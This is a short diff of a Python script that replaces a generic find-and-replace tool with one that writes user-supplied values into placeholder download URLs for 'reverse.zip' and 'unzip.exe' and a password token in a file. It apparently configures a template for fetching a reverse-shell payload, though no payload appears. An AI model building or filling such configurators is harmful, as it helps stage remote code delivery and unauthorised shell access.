@@ -1,20 +1,21 @@
 import sys
-import re
 
-# Get the command-line arguments
-search_pattern = sys.argv[1]
-replace_string = sys.argv[2]
-input_file = sys.argv[3]
-output_file = sys.argv[4]
+if len(sys.argv) != 5:
+    print("Usage: python script.py <arg1> <arg2> <arg3> <filename>")
+    sys.exit()
 
-# Read the contents of the input file
-with open(input_file, 'r') as f:
-    contents = f.read()
+arg1 = sys.argv[1]
+arg2 = sys.argv[2]
+arg3 = sys.argv[3]
+filename = sys.argv[4]
 
-# Replace the search pattern with the replace string
-new_contents = re.sub(search_pattern, replace_string, contents)
+with open(filename, 'r') as f:
+    content = f.read()
 
-# Write the modified contents to the output file
-with open(output_file, 'w') as f:
-    f.write(new_contents)
+content = content.replace("https://transfer/XXXX/reverse.zip", "https://transfer/" + arg1 + "/reverse.zip")
+content = content.replace("PASSX", arg2)
+content = content.replace("https://transfer/OOOO/unzip.exe", "https://transfer/" + arg3 + "/unzip.exe")
+
+with open(filename, 'w') as f:
+    f.write(content)
 
